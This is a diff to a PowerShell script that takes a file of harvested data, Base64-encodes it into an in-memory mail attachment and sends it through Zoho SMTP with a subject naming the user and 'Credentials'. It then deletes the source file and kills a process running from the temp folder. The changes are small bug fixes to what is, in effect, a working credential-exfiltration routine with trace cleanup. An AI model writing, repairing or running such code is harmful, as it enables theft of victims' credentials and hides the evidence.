@@ -6,28 +6,23 @@ function New-MemoryAttachment {
         [Parameter(Mandatory=$false)]
         [string]$FileName = "ani.txt",
         
-        [switch]$Obfuscate = $true
+        # FIX: Removed the "= $true". Switches are false by default.
+        [switch]$Obfuscate 
     )
 
     try {
-        # 1. Obfuscate if requested (Base64)
         $contentToStream = $Data
         if ($Obfuscate) {
             $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
             $contentToStream = [System.Convert]::ToBase64String($bytes)
         }
 
-        # 2. Setup Memory Stream
         $ms = New-Object System.IO.MemoryStream
         $writer = New-Object System.IO.StreamWriter($ms)
         $writer.Write($contentToStream)
         $writer.Flush()
-        
-        # 3. Reset position so the Mail Client reads from the beginning
         $ms.Position = 0
 
-        # 4. Return the Attachment Object
-        # Note: We return both the attachment and the stream to keep it in RAM
         return New-Object Net.Mail.Attachment($ms, $FileName)
     }
     catch {
@@ -125,39 +120,35 @@ function Send-ZohoEmail {
         Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
 
-# --- 1. Ensure TLS 1.2 is active for Zoho ---
+## Ensure TLS 1.2 for modern SMTP servers
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 if (Test-Path $outputFilePath) {
     $rawData = Get-Content $outputFilePath -Raw
     
-    # --- 2. Create the Memory Attachment ---
-    # Fix: Removed "$true" after -Obfuscate
+    # CALLING FIX: We just use -Obfuscate. We do NOT add $true after it.
     $attachment = New-MemoryAttachment -Data $rawData -FileName "anihan.txt" -Obfuscate
 
     if ($null -ne $attachment) {
-        $subject = "$env:USERNAME: Credentials - $(Get-Date -Format 'yyyy-MM-dd HH:mm')"
+        $currentDate = Get-Date -Format 'yyyy-MM-dd HH:mm'
+        $subject = "$env:USERNAME: Credentials - $currentDate"
         
-        # --- 3. Send via Zoho ---
         try {
-            # Pass the object inside an array @()
+            # Send the object inside an array
             Send-ZohoEmail -Subject $subject -Attachments @($attachment)
         }
         catch {
+            # This captures the "Failure sending mail" and explains WHY
             Write-Host "SMTP Error: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "Check: 1. App Password? 2. Port 587 Blocked? 3. Internet connection?" -ForegroundColor Yellow
         }
         finally {
-            # --- 4. Critical Cleanup ---
             $attachment.Dispose()
-            if (Test-Path $outputFilePath) { Remove-Item $outputFilePath -Force }
+            Remove-Item $outputFilePath -Force
+            Write-Host "Cleanup Complete." -ForegroundColor Gray
         }
     }
 }
-
 else {
     Write-Host "Error: Save-As operation failed. Data file not found." -ForegroundColor Red
 }
-
-
-
-
